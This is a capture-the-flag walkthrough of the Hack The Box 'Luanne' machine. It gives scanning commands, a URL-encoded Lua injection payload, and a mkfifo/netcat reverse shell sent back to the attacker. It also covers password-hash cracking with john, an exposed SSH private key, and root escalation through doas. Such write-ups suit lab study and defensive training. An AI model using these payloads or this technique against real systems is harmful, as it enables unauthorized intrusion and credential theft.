![](luanne_banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
</p>

# Scanning

## Nmap

`ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.218 | grep open | awk -F / '{print $1}' ORS=',') echo $ports && nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.218`
```diff
PORT     STATE SERVICE REASON         VERSION
+ 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
+ 80/tcp   open  http    syn-ack ttl 63 nginx 1.19.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
+ 9001/tcp open  http    syn-ack ttl 63 Medusa httpd 1.12 (Supervisor process manager)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-server-header: Medusa/1.12
|_http-title: Error response
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
```

* From port 80 nmap found a robots.txt file and inside that file there is a disallowed directory path `/weather`
* Port 80 `http://10.10.10.218` throughs a login prompt
* Port 9001 `http://10.10.10.218` throughs a login prompt 


## Web_server - Port 80

* **gobuster** inside `/weather` directory -

	`gobuster dir -u http://10.10.10.218/weather/ -w ~/git-tools/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 40`

	  /forecast (Status: 200)

* **Goto** `http://10.10.10.218/weather/forecast` through an error - 

	  {"code": 200, "message": "No city specified. Use 'city=list' to list available cities."}

* specifying `city=list` in the url and **Goto** `http://10.10.10.218/weather/forecast?city=list` give the list of cities -

	  {"code": 200,"cities": ["London","Manchester","Birmingham","Leeds","Glasgow","Southampton","Liverpool","Newcastle","Nottingham","Sheffield","Bristol","Belfast","Leicester"]}

* specifying the city name from the list `city=London` in the url `http://10.10.10.218/weather/forecast?city=London` give the weather report of the city and the report is same for every city.

* adding single quote `'` in the end `http://10.10.10.218/weather/forecast?city='` through an error

	  <br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value

* Error specified that the backend is running `lua` language.
* try diffrent lua syntex and finaly execute lua syntex - 

**Request:** `http://10.10.10.218/weather/forecast?city=%27%29%3Bprint%28%22pwn%22%29--`

**Response:** `{"code": 500,"error": "unknown city: pwn`

  * brackdown the payload - 
    1. payload is url encoded formate
	2. orignal lua syntex to fil the nill value `');<lua_syntex>--`

* there is a `os.execute` function in the lua that exeecute shell command from lua syntex.
* create a code executation payload with lua runtime - 

  **Payload:** `');os.execute("id")--`

  **[URL-Enode](https://www.url-encode-decode.com/):** `%27%29%3Bos.execute%28%22id%22%29--`

  **Request:** `http://10.10.10.218/weather/forecast?city=%27%29%3Bos.execute%28%22id%22%29--`

  **Response:** `"code": 500,"error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)`

* and this verified the command execuation vulnerbility.

# User Exploit

## USER:_httpd shell

**Reverse shell: Payload:** `');os.execute("rm  /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc tun0 4141 >/tmp/f")--`

**[URL-Enode](https://www.url-encode-decode.com/):** `%27%29%3Bos.execute%28%22rm%2520+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+tun0+4141+%3E%2Ftmp%2Ff%22%29--`

**Request:** `http://10.10.10.218/weather/forecast?city=%27%29%3Bos.execute%28%22rm%20%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20tun0%204141%20%3E%2Ftmp%2Ff%22%29--`

**Response:** `nc -nvlp 4141`

```diff
 listening on [any] 4141 ...
+connect to [10.10.14.47] from (UNKNOWN) [10.10.10.218] 65376
 sh: can't access tty; job control turned off

+$ id
+uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
```

## User Escalation

* inside the `/var/www` dir there is a `.htpasswd` file which contains a user and password hash -
```diff
$ cd /var/www
$ ls -la
+-rw-r--r--   1 root  wheel   47 Sep 16 15:07 .htpasswd
 -rw-r--r--   1 root  wheel  386 Sep 17 20:56 index.html
 -rw-r--r--   1 root  wheel   78 Nov 25 11:38 robots.txt
$ cat .htpasswd
+webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```

**Hash:** `webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0`

### john

```diff
❯ echo 'webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0' > hash
❯ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads

+iamthebest       (webapi_user)

Session completed
```

### creds 
`webapi_user:iamthebest`

## Enumeration

* login to port 80 worked but nothing interesting there,
* and login to port 9001 not working.
* home direcotry have a `r.michaels` user directory and r.michaels is a user -

	  r.michaels:*:1000:100::/home/r.michaels:/bin/ksh

* su to user `r.michaels` is not working

	  $ su - r.michaels
	  Inappropriate ioctl for device
	  su: Sorry: Conversation failure

* and [doas](https://www.freebsd.org/cgi/man.cgi?query=doas&sektion=1&manpath=freebsd-release-ports) utility is also not available for `_httpd` user - 

	  $ doas -u r.michaels /bin/ksh
	  doas: Operation not permitted

* checking network ports

	  $ netstat -ant | grep LISTEN
	  tcp        0      0  127.0.0.1.3000         *.*                    LISTEN
	  tcp        0      0  127.0.0.1.3001         *.*                    LISTEN

  * I already seen the port 3000 in port 80 login error and 3000 is the local instance of the port 80.
  * port 3001 is new

* curl on port 3001

	  $ curl 127.0.0.1:3001
	  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
									  Dload  Upload   Total   Spent    Left  Speed
	  100   199  100   199    0     0  99500      0 --:--:-- --:--:-- --:--:-- 99500
	  <html><head><title>401 Unauthorized</title></head>
	  <body><h1>401 Unauthorized</h1>
	  /: <pre>No authorization</pre>
	  <hr><address><a href="//127.0.0.1:3001/">127.0.0.1:3001</a></address>
	  </body></html>

* asking for authorization.
* using same creds to login -

	  $ curl --user webapi_user:iamthebest http://127.0.0.1:3001
	  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
									  Dload  Upload   Total   Spent    Left  Speed
	  100   386  100   386    0     0   125k      0 --:--:-- --:--:-- --:--:--  125k
	  <!doctype html>
	  <html>
	  <head>
		  <title>Index</title>
	  </head>
	  <body>
		  <p><h3>Weather Forecast API</h3></p>
		  <p><h4>List available cities:</h4></p>
		  <a href="/weather/forecast?city=list">/weather/forecast?city=list</a>
		  <p><h4>Five day forecast (London)</h4></p>
		  <a href="/weather/forecast?city=London">/weather/forecast?city=London</a>
		  <hr>
	  </body>
	  </html>

* same page that get from the port 80 login.
* tested the code execuation vulnerbility here on port 3001 and it looks line local server is not vulnerable for command execuation -

	  $ curl --user webapi_user:iamthebest "http://127.0.0.1:3001/weather/forecast?city=%27%29%3Bos.execute%28%22id%22%29--"
	  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
									 Dload  Upload   Total   Spent    Left  Speed
	  100    60    0    60    0     0  30000      0 --:--:-- --:--:-- --:--:-- 30000
	  {"code": 500,"error": "unknown city: ');os.execute("id")--"}

* Running server is nginx and like apache2 [mod_userdir](https://httpd.apache.org/docs/2.4/mod/mod_userdir.html) nginx also have this option. this allow user to create a shared dir in the `home/<user>` folder can be accessible form server with using  `~` in prefix.

* and the server on port 3001 is run by the user r.michaels

	`ps -aux | grep 185`

	  r.michaels  185  0.0  0.0  34996  2004 ?     Is    6:18AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www 

* and when testing for shared folder i found the user r.michaels ssh key's copy in the shared folder -
```diff
$ curl --user webapi_user:iamthebest "http://127.0.0.1:3001/~r.michaels/"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   601    0   601    0     0   195k      0 --:--:-- --:--:-- --:--:--  195k
<!DOCTYPE html>
<html><head><meta charset="utf-8"/>
<style type="text/css">
table {
        border-top: 1px solid black;
        border-bottom: 1px solid black;
}
th { background: aquamarine; }
tr:nth-child(even) { background: lavender; }
</style>
<title>Index of ~r.michaels/</title></head>
<body><h1>Index of ~r.michaels/</h1>
<table cols=3>
<thead>
<tr><th>Name<th>Last modified<th align=right>Size
<tbody>
+<tr><td><a href="../">Parent Directory</a><td>16-Sep-2020 18:20<td align=right>1kB
+<tr><td><a href="id_rsa">id_rsa</a><td>16-Sep-2020 16:52<td align=right>3kB
</table>
</body></html>
```

## USER:r.michaels shell

`curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa`
```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2610  100  2610    0     0   849k      0 --:--:-- --:--:-- --:--:-- 1274k
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
45bBkP5xOhrjMAAAAVci5taWNoYWVsc0BsdWFubmUuaHRiAQIDBAUG
-----END OPENSSH PRIVATE KEY-----
```

### ssh

`ssh -i michaels-id_rsa r.michaels@10.10.10.218`
```
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020

Welcome to NetBSD!

luanne$ id
uid=1000(r.michaels) gid=100(users) groups=100(users)
luanne$ cat user.txt
ea5f0ce6************************
```

### Enumeration

* inside the `/home/r.michaels/backups` folder there is a file named `devel_backup-2020-09-16.tar.gz` - 
```diff
luanne$ pwd
/home/r.michaels/backups
luanne$ ls -la
total 12
dr-xr-xr-x  2 r.michaels  users   512 Nov 24 09:26 .
dr-xr-x---  7 r.michaels  users   512 Sep 16 18:20 ..
-r--------  1 r.michaels  users  1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc
```

**enc file extention:** The .enc file extension is used by files in the UUenconded format, which are encrypted files.

**UUenconded format:** Unix-to-Unix encode (UUENCODE) format is a form of binary-to-text encoding that originated in the Unix programs uuencode and uudecode written by Mary Ann Horton at UC Berkeley in 1980, for encoding binary data for transmission in email systems.

**Tool:** in openbsd there is tool called [netpgp](https://man.netbsd.org/netpgp.1) that can be use to encrypt or decrypt. 

* decrypt `.enc` file
```diff
luanne$ netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/devel_backup-2020-09-16.tar.gz 
signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
uid              RSA 2048-bit key <r.michaels@localhost>
luanne$ ls -la /tmp
-rw-------   1 r.michaels  wheel  1639 Nov 29 09:07 devel_backup-2020-09-16.tar.gz
```

* file delete after a minute  so i copied it locally -
```diff
❯ scp -i id_rsa r.michaels@10.10.10.218:/tmp/devel_backup-2020-09-16.tar.gz devel_backup-2020-09-16.tar.gz
devel_backup-2020-09-16.tar.gz                              100% 1639     2.6KB/s   00:00  

❯ tar -xf devel_backup-2020-09-16.tar.gz

❯ cd devel-2020-09-16

❯ ls -la 

drwxr-xr-x 2 x00tex x00tex 4096 Sep 16 20:42 webapi
drwxr-xr-x 2 x00tex x00tex 4096 Nov 29 20:06 www

❯ cd www

❯ ls -la
--rw-r--r-- 1 x00tex x00tex   47 Sep 16 23:44 .htpasswd
 -rw-r--r-- 1 x00tex x00tex  378 Sep 16 20:33 index.html

❯ cat .htpasswd
+webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
```

* inside the tar archive there is a server backup data and also the `.htpasswd` file with same username but this time the hash is diffrent.

#### john
```diff
❯ echo 'webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.' >> hash

❯ john hash -w=/usr/share/wordlists/rockyou.txt
Loaded 2 password hashes with 2 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Remaining 1 password hash

+littlebear       (webapi_user)

Session completed

❯ john hash --show
webapi_user:iamthebest
+webapi_user:littlebear

2 password hashes cracked, 0 left
```

* we get a new password.
* try su to root but this time user `r.michaels` don't have su rights.

		luanne$ su - root
		su: You are not listed in the correct secondary group (wheel) to su root.
		su: Sorry: Authentication error

* try `doas` and this time it worked.

# Root escalation

```diff
+luanne$ doas -u root /bin/sh
+Password: littlebear
# id
+uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)
# cd /root
# cat root.txt
7a9b5c20************************
```